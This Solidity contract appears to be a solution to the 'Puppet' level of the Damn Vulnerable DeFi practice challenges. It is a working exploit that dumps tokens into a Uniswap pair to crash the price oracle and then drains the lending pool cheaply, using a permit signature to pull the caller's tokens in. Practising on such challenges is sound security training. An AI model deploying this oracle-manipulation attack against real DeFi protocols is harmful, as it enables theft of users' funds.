pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../puppet/PuppetPool.sol";
import "../DamnValuableToken.sol";
import "./UniswapExchangeInterface.sol";
import "hardhat/console.sol";
/**
 * @title PuppetExploit
 * @author Jasmine Abtahi
 */
contract PuppetExploit {
    using Address for address payable;

    UniswapExchangeInterface public immutable uniswapPair;
    DamnValuableToken public immutable token;
    PuppetPool public immutable pool;
    constructor(address _pool, uint8 v, bytes32 r, bytes32 s, uint256 deadline) payable {
        pool = PuppetPool (_pool);
        token = pool.token();
        uniswapPair = UniswapExchangeInterface(pool.uniswapPair());
        attack(msg.sender, v, r, s, deadline);
    }

    function attack(address recipient, uint8 v, bytes32 r, bytes32 s, uint256 deadline) private {
        uint256 amount = token.balanceOf(recipient);
        token.permit(recipient, address(this), amount, deadline, v, r, s);
        token.transferFrom(recipient, address(this), amount);
        token.approve(address(uniswapPair), amount);
        uniswapPair.tokenToEthSwapInput(amount, 1, deadline);
        pool.borrow{value: address(this).balance}(token.balanceOf(address(pool)), recipient);
    } 

    //receive() external payable {}


}